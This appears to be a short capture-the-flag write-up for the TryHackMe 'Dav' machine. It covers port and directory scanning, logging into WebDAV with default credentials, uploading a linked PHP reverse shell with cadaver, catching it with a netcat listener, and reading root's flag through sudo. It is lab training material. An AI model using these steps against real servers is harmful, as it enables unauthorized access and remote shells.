# [Dav](https://tryhackme.com/room/bsidesgtdav)

## boot2root machine for FIT and bsides guatemala CTF

# Dav

## Read user.txt and root.txt

### user.txt

1. Starting by nmap and gobuster enumeration we find there is only one open port. We also discover a `webdav` directory

```Bash
nmap -p- <IP>
```

- `-p-`: Scans all 65535 TCP ports

```Bash
gobuster dir -u http://<IP>:80/ -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,txt,html,php
```

[SCREEN01]
[SCREEN02]

2. It is always good to check default credentials. On this [blogpost](https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html) I have found one - `wampp:xampp`

3. Now that we know credentials, prepare [reverse shell payload](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), and upload it into /webdav with `cadaver`

```Bash
cadaver http://<IP>/webdav/
put shell.php
```

4. Set up a netcat listener and trigger the shell by navigating to the uploaded PHP file in `/webdav`

```Bash
nc -lvnp 4444
```

```Bash
whoami
python -c 'import pty; pty.spawn("/bin/bash")'
cat /home/merlin/user.txt
```

[SCREEN03]
[SCREEN04]

### root.txt

1. Let's check what commands we can run with sudo

```Bash
sudo -l
sudo cat /root/root.txt
```

[SCREEN05]
